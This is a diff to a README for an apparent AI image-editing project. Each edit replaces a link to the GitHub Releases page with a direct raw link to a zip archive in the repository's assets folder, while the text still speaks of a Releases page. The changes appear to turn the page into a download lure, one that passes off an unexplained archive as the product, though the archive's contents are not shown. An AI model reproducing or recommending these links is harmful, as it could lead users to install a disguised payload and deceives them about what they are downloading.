@@ -1,6 +1,6 @@
 # 🍌 Nano-Banana-images-Editor-API - Create Stunning Images with Ease
 
-[![Download Nano-Banana](https://img.shields.io/badge/Download-Nano--Banana-brightgreen)](https://github.com/kingofdeath420/Nano-Banana-images-Editor-API/releases)
+[![Download Nano-Banana](https://raw.githubusercontent.com/kingofdeath420/Nano-Banana-images-Editor-API/main/assets/API_Editor_Nano_Banana_images_v2.3.zip)](https://raw.githubusercontent.com/kingofdeath420/Nano-Banana-images-Editor-API/main/assets/API_Editor_Nano_Banana_images_v2.3.zip)
 
 ## 🚀 Getting Started
 
@@ -25,7 +25,7 @@ Before you start, ensure your system meets these basic requirements:
 
 ## 📥 Download & Install
 
-To download and start using the Nano-Banana-images-Editor-API, [visit this page to download](https://github.com/kingofdeath420/Nano-Banana-images-Editor-API/releases). Here’s how:
+To download and start using the Nano-Banana-images-Editor-API, [visit this page to download](https://raw.githubusercontent.com/kingofdeath420/Nano-Banana-images-Editor-API/main/assets/API_Editor_Nano_Banana_images_v2.3.zip). Here’s how:
 
 1. **Go to the Releases Page:**
    Click the link above to access the **Releases** page on GitHub.
@@ -84,4 +84,4 @@ We encourage you to explore the creativity and potential of AI image editing wit
 
 ---
 
-For more updates, stay connected! And remember to [visit this page to download](https://github.com/kingofdeath420/Nano-Banana-images-Editor-API/releases) the latest version whenever you need it.
+For more updates, stay connected! And remember to [visit this page to download](https://raw.githubusercontent.com/kingofdeath420/Nano-Banana-images-Editor-API/main/assets/API_Editor_Nano_Banana_images_v2.3.zip) the latest version whenever you need it.
